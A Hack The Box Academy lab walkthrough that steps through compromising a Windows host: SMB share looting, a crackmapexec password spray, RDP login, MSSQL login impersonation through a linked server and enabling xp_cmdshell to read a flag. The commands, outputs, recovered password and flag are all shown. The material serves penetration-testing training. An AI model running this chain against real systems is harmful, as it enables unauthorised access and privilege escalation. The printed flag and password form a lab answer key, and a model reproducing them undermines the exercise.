

---

The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.

---
## Question 1

### "What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)"

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A -Pn STMIP
```

  Attacking Common Services - Hard

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.112.104

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 19:19 GMT
Nmap scan report for 10.129.112.104
Host is up (0.013s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-11-27T19:16:10
|_Not valid after:  2052-11-27T19:16:10
|_ssl-date: 2022-11-27T19:20:37+00:00; +1s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-27T19:19:57+00:00
|_ssl-date: 2022-11-27T19:20:37+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2022-11-26T19:16:00
|_Not valid after:  2023-05-28T19:16:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-27T19:20:00
|_  start_date: N/A
| ms-sql-info: 
|   10.129.112.104:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Students will notice that the SMB service is open on port 445, therefore, they need to list the shares it has using `smbclient`:

Code: shell

```shell
smbclient -N -L STMIP
```

  Attacking Common Services - Hard

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ smbclient -N -L 10.129.112.104

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

Thereafter, students need to connect to the `Home` share and list the directories within it:

Code: shell

```shell
smbclient -N //STMIP/Home
```

  Attacking Common Services - Hard

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ smbclient -N //10.129.112.104/Home

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 22:18:21 2022
  ..                                  D        0  Thu Apr 21 22:18:21 2022
  HR                                  D        0  Thu Apr 21 21:04:39 2022
  IT                                  D        0  Thu Apr 21 21:11:44 2022
  OPS                                 D        0  Thu Apr 21 21:05:10 2022
  Projects                            D        0  Thu Apr 21 21:04:48 2022

		7706623 blocks of size 4096. 3168554 blocks available
```

Within the `IT` directory, there are three other directories, which are `Fiona`, `John`, and `Simon`, and within each directory, there are files that students need to `get` to use in the subsequent questions:

Code: shell

```shell
cd IT/Fiona\
get creds.txt
cd ../Simon\
get random.txt
cd ../John\
prompt
mget *
```

  Attacking Common Services - Hard

```shell-session
smb: \> cd IT\Fiona\
smb: \IT\Fiona\> get creds.txt 
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)
smb: \IT\Fiona\> cd ../Simon\
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (2.4 KiloBytes/sec) (average 2.6 KiloBytes/sec)
smb: \IT\Simon\> cd ../John\
smb: \IT\John\> prompt
smb: \IT\John\> mget *
getting file \IT\John\information.txt of size 101 as information.txt (2.5 KiloBytes/sec) (average 2.6 KiloBytes/sec)
getting file \IT\John\notes.txt of size 164 as notes.txt (4.0 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \IT\John\secrets.txt of size 99 as secrets.txt (2.4 KiloBytes/sec) (average 2.8 KiloBytes/sec)
```

The file that was retrieved from the user `simon` is `random.txt`.

Answer: {hidden}

# Attacking Common Services - Hard

## Question 2

### "Enumerate the target and find a password for the user Fiona. What is her password?"

From the previous question, students have attained the files `creds.txt`, `secrets.txt`, and `random.txt`, which all seem to contain potential passwords, therefore, students need to combine all of the files into one:

Code: shell

```shell
cat creds.txt secrets.txt random.txt > passwords.txt
```

  Attacking Common Services - Hard

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ cat creds.txt secrets.txt random.txt > passwords.txt
```

Then, with the generated passwords wordlist, students need to use `crackmapexec` to bruteforce the password of the user `fiona` on SMB:

Code: shell

```shell
sudo cme smb STMIP -u fiona -p passwords.txt
```

  Attacking Common Services - Hard

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ sudo cme smb 10.129.112.104 -u fiona -p passwords.txt

/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.112.104  445    WIN-HARD         [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona:Windows Creds STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona: STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl
```

Students will attain the password `48Ns72!bns74@S84NNNSl`.

Answer: {hidden}

# Attacking Common Services - Hard

## Question 3

### "Once logged in, what other user can we compromise to gain admin privileges?"

Using the previously attained credentials `fiona:48Ns72!bns74@S84NNNSl`, students need to connect to spawned target utilizing `xfreerdp` and then open PowerShell:

  Attacking Common Services - Hard

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-qnhsqvzyaq]─[~]
└──╼ [★]$ xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
<SNIP>
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - 	WIN-HARD
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.203.10:3389 (RDP-Server):
	Common Name: WIN-HARD
	Subject:     CN = WIN-HARD
	Issuer:      CN = WIN-HARD
	Thumbprint:  6a:a8:87:fc:e0:83:73:73:e7:da:b0:ec:d7:5d:33:e2:62:c3:97:ac:9e:d3:ae:72:b6:1c:83:93:ea:bf:50:d8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

![Attacking_Common_Services_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/40/Attacking_Common_Services_Walkthrough_Image_4.png)

Thereafter, students need to connect to the default MSSQL instance by using Windows Authentication mode, providing the name of the computer `WIN-HARD` for the `-S` option:

Code: powershell

```powershell
SQLCMD.EXE -S WIN-HARD
```

  Attacking Common Services - Hard

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
1>
```

Subsequently, students need to identify users that can be impersonated as, finding `john` and `simon`:

Code: sql

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO
```

  Attacking Common Services - Hard

```powershell-session
1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
2> GO

name
-------------
john
simon

(2 rows affected)
```

The answer will be the user `john`.

Answer: {hidden}

# Attacking Common Services - Hard

## Question 4

### "Submit the contents of the flag.txt file on the Administrator Desktop."

Using the same PowerShell session that is running `SQLCMD.exe` from the previous question, students need to query for `linked servers` from the `sysservers` table, finding one named `LOCAL.TEST.LINKED.SRV` (1 for `isremote` implies that the server is a `remote` one, while 0 implies that it is a `linked` one):

Code: sql

```sql
SELECT srvname, isremote FROM sysservers
GO
```

  Attacking Common Services - Hard

```powershell-session
1> SELECT srvname, isremote FROM sysservers
2> GO
srvname                           isremote
--------------------------------- --------
WINSRV02\SQLEXPRESS                1
LOCAL.TEST.LINKED.SRV              0

(2 rows affected)
```

From the previous question, students know that they can impersonate the user `john`, therefore, they need to check if `john` can connect to `LOCAL.TEST.LINKED.SRV` as a `sysadmin`:

Code: sql

```sql
EXECUTE AS LOGIN = 'john'
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
GO
```

  Attacking Common Services - Hard

```powershell-session
1> EXECUTE AS LOGIN = 'john'
2> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
3> GO

WINSRV02\SQLEXPRESS Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
        testadmin 1

(1 rows affected)
```

From the output, students know that `john` can connect to `LOCAL.TEST.LINKED.SRV` as the `sysadmin` user `testadmin`. Thus, with `john` being a `sysadmin`, students can enable `xp_cmdshell` on `LOCAL.TEST.LINKED.SRV` so that they can run commands afterward:

Code: sql

```sql
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
```

  Attacking Common Services - Hard

```powershell-session
1> EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
2> GO

Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

At last, students need to print out the contents of the flag file "flag.txt", which is under the `c:\users\administrator\desktop\` directory, finding it to be `HTB{46u$!n9_l!nk3d_$3rv3r$}`:

Code: sql

```sql
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
GO
```

  Attacking Common Services - Hard

```powershell-session
1> EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
2> GO

output
---------------------------------------------
HTB{46u$!n9_l!nk3d_$3rv3r$}
NULL

(2 rows affected)
```

Answer: {hidden}